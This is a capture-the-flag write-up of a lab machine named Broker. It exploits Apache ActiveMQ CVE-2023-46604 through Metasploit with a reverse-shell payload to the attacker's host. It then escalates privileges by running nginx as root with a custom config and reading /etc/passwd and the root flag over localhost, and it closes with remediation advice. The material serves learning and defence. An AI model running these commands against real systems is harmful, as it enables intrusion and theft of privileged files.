Summary

Broker exposed several messaging-related services, including Apache ActiveMQ on port 61616. Nmap identified the OpenWire transport as ActiveMQ 5.15.15, which is vulnerable to CVE-2023-46604. I used Metasploit to exploit the vulnerable ActiveMQ service and obtained a shell as the activemq user.

After gaining access, sudo -l showed that the activemq user could run /usr/sbin/nginx as root without a password. Using a custom nginx configuration, I started nginx as root and served the filesystem over localhost. This allowed me to read privileged files, including the root flag.

Initial Access

Apache ActiveMQ 5.15.15 is vulnerable to CVE-2023-46604, a remote code execution vulnerability affecting the OpenWire protocol. Since the target exposed ActiveMQ on port 61616, I used the Metasploit module for this vulnerability. 

msfconsole
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOSTS 10.129.230.87
set RPORT 61616
set target 1
set payload cmd/linux/http/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.209
set LPORT 4444
run

During exploitation, I had to adjust the Metasploit HTTP server ports because some local ports were already in use. After using available ports, the exploit succeeded and returned a shell as the activemq user. 

whoami
activemq

Privilege Escalation Enumeration

After obtaining a shell, I checked sudo permissions for the activemq user. 

sudo -l

The output showed:

Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx

This meant the activemq user could run nginx as root without needing a password. Since nginx can be started with a custom configuration file, I could make nginx serve files from the root filesystem.

Privilege Escalation with nginx

I created a custom nginx configuration in /tmp. The important part is root /;, which tells nginx to serve files starting from the top of the filesystem. Because nginx is started with sudo, it runs as root and can read files that the activemq user normally cannot access. 

cat > /tmp/nginx-root.conf <<'EOF'
user root;
worker_processes 1;
pid /tmp/nginx-root.pid;

events {
    worker_connections 1024;
}

http {
    server {
        listen 127.0.0.1:1337;
        root /;
        autoindex on;
    }
}
EOF

I then started nginx using the custom configuration:

sudo /usr/sbin/nginx -c /tmp/nginx-root.conf

To verify that the technique worked, I requested /etc/passwd through localhost:

curl http://127.0.0.1:1337/etc/passwd

The file was successfully returned, confirming that nginx was serving the filesystem.

I then read the root flag:

curl http://127.0.0.1:1337/root/root.txt
root flag: [REDACTED]

Cleanup

After collecting the flag, I stopped the temporary nginx instance and removed the custom config file.

sudo /usr/sbin/nginx -s stop -c /tmp/nginx-root.conf
rm /tmp/nginx-root.conf

Attack Path

1. Enumerated open ports with Nmap.
2. Identified Apache ActiveMQ 5.15.15 on port 61616.
3. Exploited CVE-2023-46604 using Metasploit.
4. Gained shell as activemq.
5. Found sudo permission allowing activemq to run /usr/sbin/nginx as root.
6. Created a custom nginx config serving the root filesystem.
7. Used localhost curl requests to read /home/activemq/user.txt and /root/root.txt.

Lessons Learned

  • Version detection is critical because the ActiveMQ version directly pointed to a known RCE vulnerability.
  • Messaging services such as ActiveMQ, STOMP, MQTT, and AMQP should not be unnecessarily exposed.
  • sudo -l is one of the first commands to run after getting a shell because misconfigured sudo permissions can lead to privilege escalation.
  • GTFOBins is useful for understanding how allowed binaries can be abused in unintended ways.
  • Allowing a low-privileged user to run nginx as root is dangerous because a custom config can expose sensitive files.

Remediation

  • Upgrade Apache ActiveMQ to a patched version that is not vulnerable to CVE-2023-46604.
  • Restrict access to ActiveMQ management and transport ports using firewall rules or VPN-only access.
  • Remove unnecessary sudo permissions for service accounts.
  • Do not allow service users to run nginx as root with arbitrary configuration files.
  • Monitor for suspicious nginx processes running with non-standard configuration files or listening on unusual localhost ports.

Conclusion

Broker demonstrated how an exposed vulnerable service can lead to initial access and how a simple sudo misconfiguration can allow privilege escalation. The ActiveMQ service provided the foothold, while the ability to run nginx as root allowed privileged file reads and access to the root flag.
